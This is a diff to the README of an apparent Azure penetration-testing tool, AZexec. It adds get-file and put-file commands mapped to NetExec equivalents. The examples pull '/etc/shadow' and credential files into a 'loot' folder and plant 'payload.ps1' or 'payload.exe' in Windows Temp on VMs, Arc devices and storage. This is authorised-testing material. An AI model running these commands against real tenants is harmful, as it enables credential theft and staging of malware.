@@ -43,6 +43,7 @@
 - [Enumerate Local Groups](#-enumerate-local-groups---azureentra-id-equivalent)
 - [Workstation Service (wkssvc) Equivalent](#-workstation-service-wkssvc-equivalent-vm-loggedon-command)
 - [Azure Resource Manager Enumeration](#️-azure-resource-manager-enumeration-multi-subscription)
+- [File Transfer (get-file/put-file)](#file-transfer-get-file--put-file)
 - [Remote Command Execution](#-remote-command-execution---azures-netexec--x-x-equivalent)
 - [Getting Shells - Empire and Metasploit](#-getting-shells---empire-and-metasploit-integration)
 - [Features](#-features)
@@ -128,6 +129,8 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> --spider` | `.\azx.ps1 spider` | ✅ Required | **Spider Azure Storage** (enumerate blobs/files) |
 | `nxc smb <target> -M spider_plus -o DOWNLOAD_FLAG=True` | `.\azx.ps1 spider -Download -OutputFolder C:\Loot` | ✅ Required | **Spider with downloads** |
 | `nxc smb <target> --spider --pattern txt,doc` | `.\azx.ps1 spider -Pattern "txt,docx,key,pem,pfx,config"` | ✅ Required | **Spider with pattern filter** |
+| `nxc smb <target> --get-file \\C$\file.txt /local/file.txt` | `.\azx.ps1 get-file -VMName "vm" -RemotePath "C:\file.txt" -LocalPath ".\file.txt"` | ✅ Required | **Download file from target** |
+| `nxc smb <target> --put-file /local/file.txt \\C$\file.txt` | `.\azx.ps1 put-file -VMName "vm" -LocalPath ".\file.txt" -RemotePath "C:\file.txt"` | ✅ Required | **Upload file to target** |
 
 **Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.
 
@@ -1494,6 +1497,103 @@ nxc smb IP -M spider_plus -o DOWNLOAD_FLAG=True
 [*] VM SPIDER SUMMARY
 [*] VMs Spidered: 3 | Total Files Scanned: 5,421
 [*] Pattern Matches: 87 | Critical Files: 12
+```
+
+---
+
+### File Transfer: `get-file` / `put-file`
+
+The `get-file` and `put-file` commands are the **Azure equivalent of NetExec's `--get-file` and `--put-file` options**. They support file transfers to/from:
+
+1. **Azure Storage** - Blob containers & Azure File Shares
+2. **Azure VMs** - Via VM Run Command (base64 encoded)
+3. **Arc Devices** - Via Connected Machine Run Command (base64 encoded)
+
+#### Download Files (get-file)
+
+```powershell
+# Download from Azure VM
+.\azx.ps1 get-file -VMName "vm-web-01" -RemotePath "C:\Users\admin\secret.txt" -LocalPath ".\loot\secret.txt"
+
+# Download from Arc device
+.\azx.ps1 get-file -DeviceName "arc-server-01" -RemotePath "/etc/shadow" -LocalPath ".\shadow"
+
+# Download from Blob Storage
+.\azx.ps1 get-file -StorageAccountTarget "mystorageacct" -ContainerTarget "data" -RemotePath "secrets/creds.txt" -LocalPath ".\loot\creds.txt"
+
+# Download from File Share
+.\azx.ps1 get-file -StorageAccountTarget "mystorageacct" -ContainerTarget "fileshare" -RemotePath "configs/app.config" -LocalPath ".\app.config"
+```
+
+#### Upload Files (put-file)
+
+```powershell
+# Upload to Azure VM
+.\azx.ps1 put-file -VMName "vm-web-01" -LocalPath ".\payload.ps1" -RemotePath "C:\Windows\Temp\payload.ps1"
+
+# Upload to Arc device
+.\azx.ps1 put-file -DeviceName "arc-server-01" -LocalPath ".\script.sh" -RemotePath "/tmp/script.sh"
+
+# Upload to Blob Storage
+.\azx.ps1 put-file -StorageAccountTarget "mystorageacct" -ContainerTarget "uploads" -LocalPath ".\data.txt" -RemotePath "folder/data.txt"
+
+# Upload to File Share
+.\azx.ps1 put-file -StorageAccountTarget "mystorageacct" -ContainerTarget "fileshare" -LocalPath ".\config.xml" -RemotePath "configs/config.xml"
+```
+
+**NetExec Comparison**:
+
+```bash
+# NetExec SMB file transfer
+nxc smb 192.168.1.10 -u user -p pass --get-file '\\C$\Users\admin\secret.txt' '/tmp/secret.txt'
+nxc smb 192.168.1.10 -u user -p pass --put-file '/tmp/payload.exe' '\\C$\Windows\Temp\payload.exe'
+
+# AZexec Azure file transfer
+.\azx.ps1 get-file -VMName vm-01 -RemotePath "C:\Users\admin\secret.txt" -LocalPath ".\secret.txt"
+.\azx.ps1 put-file -VMName vm-01 -LocalPath ".\payload.exe" -RemotePath "C:\Windows\Temp\payload.exe"
+```
+
+**Parameters**:
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `-LocalPath` | Yes | Local file path (source for put-file, destination for get-file) |
+| `-RemotePath` | Yes | Remote file path on target |
+| `-VMName` | No* | Target Azure VM by name |
+| `-DeviceName` | No* | Target Arc-enabled device by name |
+| `-StorageAccountTarget` | No* | Target storage account name |
+| `-ContainerTarget` | No | Target container/share name (required with StorageAccountTarget) |
+| `-MaxFileSize` | No | Maximum file size in MB for VM/Device downloads (default: 10) |
+
+*One target parameter required: `-VMName`, `-DeviceName`, or `-StorageAccountTarget`
+
+**RBAC Requirements**:
+| Transfer Target | Required Permissions |
+|-----------------|---------------------|
+| Blob Storage (read) | Storage Blob Data Reader |
+| Blob Storage (write) | Storage Blob Data Contributor |
+| File Shares (read) | Storage File Data SMB Share Reader |
+| File Shares (write) | Storage File Data SMB Share Contributor |
+| Azure VMs | Reader + Virtual Machine Command Executor (or VM Contributor) |
+| Arc Devices | Azure Connected Machine Resource Administrator |
+
+**Limitations**:
+- VM/Device transfers use base64 encoding via Run Command, limited to ~500KB files
+- For larger files, use Azure Storage as an intermediary
+- Storage transfers have no practical size limit
+
+**Sample Output**:
+```
+[*] AZX - Azure File Transfer
+[*] Command: put-file (Azure equivalent of nxc smb --put-file)
+
+[*] Uploading: .\payload.ps1 -> C:\Windows\Temp\payload.ps1
+[*] Local file size: 1.2KB
+
+[*] Target: Azure VM (vm-web-01)
+AZR    vm-web-01            VM     PUT    C:\Windows\Temp\payload.ps1    [+] SUCCESS    Size: 1.2KB
+
+[*] TRANSFER SUMMARY
+[*] Files Transferred: 1 | Total Size: 1.2KB | Errors: 0
 ```
 
 ---
